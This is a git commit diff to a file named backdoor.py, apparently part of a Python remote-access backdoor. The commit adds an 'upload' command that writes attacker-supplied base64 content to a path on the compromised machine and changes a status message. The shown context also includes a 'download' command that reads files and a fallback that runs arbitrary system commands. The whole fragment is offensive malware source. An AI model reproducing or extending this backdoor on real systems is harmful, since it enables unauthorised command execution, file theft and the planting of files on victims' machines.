cc42d22fde50f563a45ed007c6830f552d61aee4
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-07 19:10:01 +0530

    Uploading fuctionality - backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -36,7 +36,7 @@ class Backdoor:
     def write_file(self, path, content):
         with open(path , "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Download successful"    
+            return "[+] Upload successful"    
 
     def read_file(self, path):
         with open(path, "rb") as file:
@@ -52,6 +52,8 @@ class Backdoor:
                 command_result = self.change_working_directory_to(command[1])
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+            elif command[0] == "upload":
+                command_result = self.write_file(command[1], command[2])    
             else:    
                 command_result = self.execute_system_command(command)
            
